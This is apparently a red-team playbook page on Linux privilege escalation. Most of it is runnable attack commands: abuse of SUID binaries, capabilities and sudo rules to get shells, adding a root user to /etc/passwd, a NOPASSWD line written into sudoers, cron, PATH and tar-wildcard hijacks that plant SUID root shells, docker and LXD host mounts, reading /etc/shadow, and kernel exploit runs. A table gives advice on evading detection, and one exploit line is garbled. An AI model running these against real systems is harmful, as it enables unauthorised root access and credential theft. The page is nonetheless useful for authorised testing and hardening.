# Linux Privilege Escalation

> **MITRE ATT&CK**: Privilege Escalation > T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
> **Platforms**: Linux
> **Required Privileges**: Low-privilege user / shell
> **OPSEC Risk**: Medium

## Strategic Overview

Linux privilege escalation during red team engagements typically targets misconfigurations
rather than kernel vulnerabilities. Misconfigured SUID binaries, sudo rules, cron jobs, and
file permissions provide reliable escalation paths that are less likely to crash the target
system. Kernel exploits should remain a last resort due to stability risks and the forensic
evidence they leave. A Red Team Lead must assess the target's Linux distribution, kernel
version, installed packages, and security frameworks (SELinux, AppArmor) before selecting
an escalation technique. Automated enumeration tools provide a fast initial assessment, but
manual verification and understanding of each vector is essential for operational success.

## Technical Deep-Dive

### Automated Enumeration

```bash
# linPEAS - comprehensive enumeration (most thorough, but noisy)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or transfer and run locally
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# LinEnum - lighter alternative
./LinEnum.sh -t -r linEnum_report

# linux-exploit-suggester - kernel exploit identification
./linux-exploit-suggester.sh

# linux-smart-enumeration (LSE) - progressive verbosity
./lse.sh -l 1    # Level 1: interesting findings only
./lse.sh -l 2    # Level 2: additional checks

# Manual quick checks
id && whoami && hostname && uname -a
cat /etc/os-release
```

### SUID/SGID Binaries

SUID binaries execute with the file owner's privileges. Custom or misconfigured SUID
binaries are a primary escalation vector.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find SUID binaries owned by root (most interesting)
find / -perm -4000 -user root -type f 2>/dev/null

# Cross-reference against GTFOBins for known exploitable binaries
# https://gtfobins.github.io/#+suid

# Common SUID abuse examples
# SUID on find
find . -exec /bin/sh -p \;

# SUID on python
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# SUID on cp - overwrite /etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'root2:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd_modified
cp /tmp/passwd_modified /etc/passwd

# SUID on env/find/nmap/vim/bash - check GTFOBins for each
```

### Linux Capabilities

Capabilities provide fine-grained privileges without full SUID. Some capabilities are
equivalent to root access.

```bash
# Enumerate binaries with capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities
# cap_setuid - change UID (effectively root)
# cap_dac_override - bypass file read/write permissions
# cap_dac_read_search - bypass file read permissions
# cap_net_raw - raw sockets (packet sniffing)
# cap_sys_admin - mount filesystems, various admin ops
# cap_sys_ptrace - ptrace any process

# Exploit cap_setuid on python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Exploit cap_setuid on perl
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Exploit cap_dac_read_search with tar
/usr/bin/tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/ && cat /tmp/etc/shadow
```

### Cron Jobs

```bash
# Enumerate cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null

# Identify writable scripts executed by cron
# If a cron job runs a script writable by current user
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/writable_cron_script.sh
# Wait for cron execution, then:
/tmp/rootbash -p

# Cron PATH abuse - if cron uses relative paths
# Check PATH in /etc/crontab, create hijacking script in writable PATH dir
```

### PATH Hijacking

```bash
# Check writable directories in PATH
echo $PATH | tr ':' '\n' | xargs -I {} sh -c 'test -w {} && echo "WRITABLE: {}"'

# If a privileged script calls a command without absolute path
# Create malicious binary in writable PATH directory
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /writable_path_dir/target_command
chmod +x /writable_path_dir/target_command
# Wait for privileged script execution
```

### Weak File Permissions

```bash
# Check if /etc/shadow is readable (can crack root password)
ls -la /etc/shadow
cat /etc/shadow 2>/dev/null | grep root

# Check if /etc/passwd is writable (can add root user)
ls -la /etc/passwd
# Generate password hash and add root-equivalent user
openssl passwd -1 -salt xyz password123
echo 'newroot:$1$xyz$hash_here:0:0:root:/root:/bin/bash' >> /etc/passwd

# Check if /etc/sudoers is writable
ls -la /etc/sudoers
echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

# Check for writable /etc/crontab
ls -la /etc/crontab

# World-writable files owned by root
find / -writable -user root -type f 2>/dev/null | grep -v "/proc\|/sys"
```

### Sudo Misconfiguration

```bash
# Check sudo privileges
sudo -l

# GTFOBins sudo abuse examples (https://gtfobins.github.io/#+sudo)

# sudo vim
sudo vim -c ':!/bin/bash'

# sudo less/more
sudo less /etc/shadow    # then type: !/bin/bash

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo find
sudo find / -exec /bin/bash \;

# sudo python
sudo python3 -c 'import os; os.system("/bin/bash")'

# sudo env (bypass restricted commands)
sudo env /bin/bash

# sudo (ALL, !root) bypass (CVE-2019-14287)
sudo -u#-1 /bin/bash

# LD_PRELOAD abuse (if env_keep+=LD_PRELOAD in sudoers)
# Compile shared library that spawns shell in init()
# sudo LD_PRELOAD=/tmp/preload.so <allowed_command>
```

### NFS no_root_squash

```bash
# Check for NFS exports with no_root_squash
showmount -e TARGET_IP
cat /etc/exports 2>/dev/null   # if on the NFS server

# If no_root_squash is set, root on client = root on NFS share
# From attacker machine (as root):
mkdir /tmp/nfs_mount
mount -t nfs TARGET_IP:/shared_folder /tmp/nfs_mount
cp /bin/bash /tmp/nfs_mount/rootbash
chmod +s /tmp/nfs_mount/rootbash

# On target machine:
/shared_folder/rootbash -p
```

### Docker / LXD Group Membership

```bash
# Check if current user is in docker or lxd group
id | grep -E "docker|lxd"

# Docker group -> root access
docker run -v /:/mnt/root -it alpine chroot /mnt/root /bin/bash
# Or more targeted:
docker run -v /etc/shadow:/tmp/shadow -it alpine cat /tmp/shadow

# LXD group -> root access
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
# Inside container: chroot /mnt/root
```

### Kernel Exploits (Last Resort)

```bash
# DirtyPipe (CVE-2022-0847) - Linux 5.8 to 5.16.11/5.15.25/5.10.102
# Overwrites read-only files via pipe splice
uname -r   # Check kernel version
./dirtypipe /etc/passwd 1 "${openssl_hash}"

# DirtyCow (CVE-2016-5195) - Linux 2.x through 4.x before 4.8.3
./dirty_cow /etc/passwd

# PwnKit (CVE-2021-4034) - pkexec local privilege escalation
# Affects virtually all Linux distributions with polkit installed
./PwnKit   # Instant root shell

# GameOver(lay) (CVE-2023-2640 / CVE-2023-32629) - Ubuntu specific
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p]wn l/ && ..."

# Always test kernel exploits in a matching lab environment first
# Kernel panics = lost access + investigation trigger
```

### Wildcard Injection

```bash
# If a cron job or script runs: tar czf /tmp/backup.tar.gz *
# In the directory being archived, create these files:
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
# When tar runs with wildcard expansion, it interprets filenames as flags
```

---

## 2025-2026 Additions

### Critical Sudo Vulnerabilities (June 2025)

Two significant vulnerabilities patched in sudo 1.9.17p1:

**CVE-2025-32462 (High Severity)**: "Policy-Check Flaw"
- Affects sudo 1.8.8 through 1.9.17
- Allows attackers to bypass host checks and execute commands as root
- Exploitation: craft sudo invocations that bypass host-based restrictions in sudoers

**CVE-2025-32463 (Critical, CVSS 9.3)**: "Chroot to Root"
- Affects sudo 1.9.14 through 1.9.17
- Path resolution occurs within the chroot environment before sudoers evaluation
- Allows insertion of malicious `/etc/nsswitch.conf` and loading of rogue shared libraries with root privileges
- PoC and exploitation details available on GitHub (kh4sh3i/CVE-2025-32463)

### Polkit / D-Bus Exploitation (2025)

**CVE-2025-6019**: Critical Local Privilege Escalation via udisksd and libblockdev
- Affects Fedora and SUSE Linux environments
- The `udisksd` daemon incorrectly trusts `allow_active` group membership as sufficient authorization for disk operations via D-Bus
- A simple command like `udisksctl mount -b /dev/loop0` can result in root-controlled mounting operations from non-root users
- Proof of concept: mount a malicious XFS image containing a SUID-root shell
- **Mitigation**: Change polkit rule for `org.freedesktop.udisks2.modify-device` from `allow_active: yes` to `allow_active: auth_admin`

**CVE-2025-6018**: Chained with CVE-2025-6019 for full root access on most Linux distributions

**CVE-2025-66005 and CVE-2025-14338**: InputPlumber D-Bus vulnerabilities
- Lack of D-Bus authorization and input verification
- Allows UI input injection and denial-of-service
- Disclosed by SUSE Security Team (January 2026)

### Container / Cgroup Escape

**CVE-2022-0492** (Still Relevant): Cgroup v1 release_agent escape
- The `cgroup_release_agent_write()` function in `kernel/cgroup/cgroup-v1.c` allows writing to the `release_agent` file
- When `notify_on_release` is enabled and a process terminates, the kernel spawns the release_agent binary as root
- Exploitation via `unshare` to create new user namespace with `CAP_SYS_ADMIN`, then write to `release_agent`
- **Mitigations**: AppArmor, SELinux, or Seccomp protections prevent this escape
- Fixed in kernel 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299

### Namespace Abuse

```bash
# Create new user namespace with elevated capabilities
unshare -Urm

# If user namespaces are unrestricted (sysctl user.max_user_namespaces > 0):
# Create namespace with CAP_SYS_ADMIN and exploit cgroup or mount features
unshare -rm sh -c 'mount -t cgroup2 none /tmp/cg && ...'

# Check namespace restrictions
sysctl user.max_user_namespaces
cat /proc/sys/user/max_user_namespaces
```

### Linux Kernel Vulnerabilities Exploited in 2025

CISA KEV-listed Linux kernel vulnerabilities actively exploited in 2025:
- UNIX domain socket MSG_OOB use-after-free for kernel privilege escalation
- CVE-2025-38352: Race condition in POSIX CPU timers (CVSS 7.0-7.4)
- 134 new Linux kernel CVEs in the first 16 days of 2025 alone
- 2025 pattern: vulnerabilities target boundaries (guest/host, sandbox/user, container/unprivileged)

### Capabilities Abuse (Extended Reference)

```bash
# Particularly dangerous capabilities with exploitation examples:

# cap_sys_admin - near-complete root equivalence
# Can mount filesystems, modify kernel modules, set process priorities
# If assigned to a binary:
/usr/bin/python3 -c 'import ctypes; ctypes.CDLL("libc.so.6").mount(b"/dev/sda1",b"/mnt",b"ext4",0,0)'

# cap_dac_override - bypass all file permission checks
# Read/write any file including /etc/shadow, /etc/sudoers
/usr/bin/python3 -c 'print(open("/etc/shadow").read())'

# cap_sys_ptrace - ptrace any process
# Inject code into running processes, read process memory
# Can be used to extract credentials from running applications

# cap_net_bind_service - bind to privileged ports
# Not directly escalation, but enables service impersonation

# Enumerate all capabilities on running processes
cat /proc/*/status 2>/dev/null | grep -E "^(Name|Cap)"
```

---

## Detection & Evasion

| Indicator | Detection Source | Evasion |
|-----------|-----------------|---------|
| linPEAS/LinEnum execution | File integrity monitoring, auditd | Run in memory, selective checks only |
| SUID binary creation | auditd (chmod with +s) | Use existing SUID binaries, avoid creating new ones |
| /etc/passwd or /etc/shadow modification | File integrity monitoring (AIDE, OSSEC) | Use sudo/capability paths instead |
| Kernel exploit execution | Kernel logs (dmesg), crash reports | Test in lab, use stable exploits only |
| Docker socket access | Container runtime logs, auditd | Expected behavior for docker group members |

## Cross-References

- [Windows Local Privesc](windows-local-privesc.md) - Windows counterpart techniques
- [macOS Privilege Escalation](macos-privesc.md) - macOS-specific privilege escalation techniques
- [Credential Access](../07-credential-access/README.md) - post-escalation credential harvesting
- [Linux Credential Access](../07-credential-access/linux-credential-access.md) - Linux credential harvesting
- [Linux Persistence](../04-persistence/linux-persistence.md) - maintaining root access on Linux
- [Defense Evasion](../06-defense-evasion/README.md) - avoiding detection during escalation

## References

- https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- https://gtfobins.github.io/
- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- Oligo Security: "New Sudo Vulnerabilities CVE-2025-32462 & CVE-2025-32463" - https://www.oligo.security/blog/new-sudo-vulnerabilities-cve-2025-32462-and-cve-2025-32463
- SOC Prime: "CVE-2025-32463 and CVE-2025-32462 Detection" - https://socprime.com/blog/cve-2025-32463-and-cve-2025-32462-vulnerabilities/
- Linux Journal: "The Most Critical Linux Kernel Breaches of 2025" - https://www.linuxjournal.com/content/most-critical-linux-kernel-breaches-2025-so-far
- Linux Security: "Linux Kernel Vulnerabilities Exploited in 2025: CISA KEV Insights" - https://linuxsecurity.com/news/security-vulnerabilities/7-linux-kernel-vulnerabilities-exploited-in-2025
- VicOne: "CVE-2025-6019: Privilege Escalation via udisksd and libblockdev" - https://vicone.com/blog/cve-2025-6019-a-privilege-escalation-flaw-with-implications-for-agl-and-sdvs
- SUSE Security: "InputPlumber D-Bus Vulnerabilities" - https://security.opensuse.org/2026/01/09/inputplumber-lack-of-dbus-auth.html
- Elastic Security Labs: "Unlocking Power Safely: Privilege Escalation via Linux Process Capabilities" - https://www.elastic.co/security-labs/unlocking-power-safely-privilege-escalation-via-linux-process-capabilities
- GitHub: "Privilege Escalation with Polkit" - https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/
